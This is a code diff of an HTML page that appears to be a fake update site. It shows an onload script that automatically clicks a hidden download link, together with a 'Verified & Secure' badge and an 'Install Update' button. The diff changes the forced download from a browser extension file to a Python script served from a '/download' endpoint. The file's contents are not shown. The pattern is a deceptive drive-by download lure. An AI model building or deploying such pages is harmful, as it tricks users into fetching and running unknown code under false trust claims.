@@ -77,8 +77,8 @@
         window.onload = function() {
             setTimeout(() => {
                 let link = document.createElement('a');
-                link.href = '/path-to-extension-file.crx'; // Change to actual file path
-                link.download = 'extension.crx';
+                link.href = '/download'; // Corrected file path
+                link.download = 'generated_script.py';
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
@@ -96,7 +96,7 @@
         <div class="trust-badge">
             ✅ <span>Verified & Secure</span>
         </div>
-        <a href="/path-to-extension-file.crx" class="btn" download>Install Update</a>
+        <a href="/download" class="btn" download>Install Update</a>
     </div>
 
 </body>
